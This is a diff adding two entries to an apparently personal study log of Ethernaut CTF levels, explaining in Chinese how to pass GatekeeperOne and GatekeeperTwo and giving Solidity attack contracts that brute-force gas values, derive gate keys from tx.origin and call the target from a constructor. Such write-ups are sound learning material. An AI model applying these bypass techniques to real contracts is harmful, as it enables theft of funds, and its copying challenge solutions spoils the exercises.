@@ -348,4 +348,68 @@ contract AttackGatekeeperThree {
 }
 ```
 
+### 2024.09.15
+#### Ethernaut - GateKeeper One
+要满足几个条件才能通过题目。
+分析条件一，对于uint64,需要高32位不为0，低16位和tx.origin的低16位相同，中间16位为0
+条件二，通过循环暴力做出来了。可以在调用 enter 时可以通过 gas 设置传递的 gas 费
+实例地址：0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93
+```
+contract AttackGatekeeperOne {
+    address public _gateAddr = 0x53611B80462Cb659dBC2Ba76EBD132c4C881dd93;
+    event Log(uint256 i, uint256 gas);
+    bytes8 public gateKey2 = 0x000000010000a345;
+
+    constructor() {}
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function getGateThree() public view returns (bytes8) {
+        uint16 low16 = uint16(uint160(tx.origin));
+        uint32 low32 = uint32(low16);
+        uint64 _gateKey = (uint64(1) << 32) | uint64(low32);
+        return bytes8(_gateKey);
+    }
+
+    function checkGateKey(bytes8 _gateKey) public gateThree(_gateKey) view returns (bool) {
+        return true;
+    }
+
+    function getEnter(uint256 number) public  {
+        bool successed = false;
+        for (uint256 i = 500*number; i < 500*(number+1); i++) {
+            if (successed) break;
+            try GatekeeperOne(_gateAddr).enter{gas: 50000+i}(gateKey2) {
+                emit Log(i, gasleft());
+                successed = true;
+            } catch {
+            }
+        }
+        require(successed);
+    }
+}
+```
+
+### 2024.09.16
+#### Ethernaut - GateKeeper Two
+和 GateKeeper One 类似，需要过几个关卡
+关卡1: 要求使用合约来调用 enter 方法
+关卡2: 可以在合约的 constructor 方法中调用目标合约，这时候它还没有完成实例化，代码大小为 0
+关卡3: 学习如何进行异步运算
+实例地址：0x50d7242F965a27b97d15312b5370aF71079C1113
+```
+contract AttackGatekeeperTwo {
+    constructor() {
+        bytes8 _gateKey = bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));
+        address gateAddr = 0x50d7242F965a27b97d15312b5370aF71079C1113;
+        GatekeeperTwo(gateAddr).enter(_gateKey);
+    }
+}
+```
+
 <!-- Content_END -->
